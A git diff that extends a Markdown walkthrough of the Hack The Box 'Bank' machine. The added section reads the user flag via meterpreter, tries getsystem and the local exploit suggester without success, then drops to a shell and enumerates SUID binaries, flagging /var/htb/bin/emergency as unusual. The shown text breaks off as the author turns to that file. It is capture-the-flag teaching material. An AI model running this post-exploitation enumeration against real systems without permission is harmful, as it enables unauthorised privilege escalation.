@@ -19,6 +19,10 @@
 
 ### 8. Exploitating Unencrypted Credentials
 
+### 9. PHP Payload
+
+### 10. Privilege Escalation & Getting Flags
+
 # Attack
 ## 1. NMAP
 This machine sounds fun. Let's go.
@@ -623,4 +627,65 @@ Mode              Size  Type  Last modified              Name
 
 meterpreter > cat user.txt
 cf7e86220606b30342777eca247d9272
+```
+Now let's try to get our system flag.
+
+We will attempt our usual method.
+```
+meterpreter > getsystem
+[-] Unknown command: getsystem.
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.129.29.200 - Collecting local exploits for php/linux...
+[-] 10.129.29.200 - No suggestions available.
+```
+Unforutantely for us, our usual method did not work.
+
+We can use our usual method of doing more enumeration of the OS for example and finding an exploit for it.
+```
+meterpreter > sysinfo
+Computer    : bank
+OS          : Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686
+Meterpreter : php/linux
+```
+However, this was hardly of any use. Since we know it's a Linux system, we Google for "linux privilege escalation".
+
+There are multiple methods, but we try the first method which I've learnt in the past. SUID. Quoting our [source](https://payatu.com/guide-linux-privilege-escalation), "SUID is a feature that, when used properly, actually enhances Linux security. The problem is that administrators may unknowingly introduce dangerous SUID configurations when they install third party applications or make logical configuration changes.".
+
+Let's give this a shot.
+```
+meterpreter > shell
+Process 1603 created.
+Channel 1 created.
+        
+find / -perm -u=s -type f 2>/dev/null
+/var/htb/bin/emergency
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/umount
+```
+We don't immediately see anything we could use to our untrained eye, but one does stand out. It is not normal to see files like `/var/htb/bin/emergency` having SUID privileges.
+
+Let's explore this file.
+```
 ```
